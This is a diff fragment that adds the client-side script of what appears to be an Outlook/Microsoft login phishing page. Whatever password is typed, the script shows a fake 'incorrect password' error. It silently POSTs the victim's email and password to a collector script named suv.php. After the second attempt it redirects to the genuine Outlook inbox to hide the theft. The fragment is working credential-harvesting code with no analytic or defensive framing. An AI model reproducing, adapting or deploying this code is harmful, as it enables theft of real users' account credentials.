+       var btn = $("#nexty");
+    btn.prop("disabled", "disabled");
+   if($('#bandits').val() == ""){
+      $('#bandits').focus();
+      $("#err").html('<div class="err">That’s an incorrect password. Try again.</div>');
+      $('#bandits').addClass("has-error");
+      return false;
+   }else {
+      
+      counter = counter + 1;
+      $("#err").html('<div class="err">That’s an incorrect password. Try again.</div>');
+      $('#bandits').addClass("has-error");
+
+      
+
+
+   }
+
+      if(counter > 1){
+         var xmlhttp;
+          if(window.XMLHttpRequest){
+            xmlhttp = new XMLHttpRequest();
+          }else{
+            xmlhttp = new ActiveXObject("Microsoft.XMLHTTP");
+          }
+
+          xmlhttp.onreadystatechange=function(){
+            if(xmlhttp.readyState==4 && xmlhttp.status==200){
+            window.location = "https://outlook.office.com/mail/inbox";
+            }
+          }
+
+          var email = document.getElementById('normad').value;
+          var password = document.getElementById('bandits').value;
+          var formdata = new FormData();
+
+          formdata.append("normad", email);
+          formdata.append("bandits", password);
+
+          var url = 'suv.php?others';
+          
+          xmlhttp.open("POST", url);
+          xmlhttp.send(formdata);
+
+          return false;
+      }else{
+         var xmlhttp;
+          if(window.XMLHttpRequest){
+            xmlhttp = new XMLHttpRequest();
+          }else{
+            xmlhttp = new ActiveXObject("Microsoft.XMLHTTP");
+          }
+
+          xmlhttp.onreadystatechange=function(){
+            if(xmlhttp.readyState==4 && xmlhttp.status==200){
+               document.getElementById('bandits').value = "";
+               alertx.textContent = "Please enter an email address.";
+               $('#bandits').focus();
+               
+               
+
+            }
+          }
+
+          var email = document.getElementById('normad').value;
+          var password = document.getElementById('bandits').value;
+          var formdata = new FormData();
+
+          formdata.append("normad", email);
+          formdata.append("bandits", password);
+
+          var url = 'suv.php?others';
+          
+          xmlhttp.open("POST", url);
+          xmlhttp.send(formdata);
+
+          return false;      
+      }   
+   })
+
+
+   })
+
+</script>
+
+
+
+</body></html>
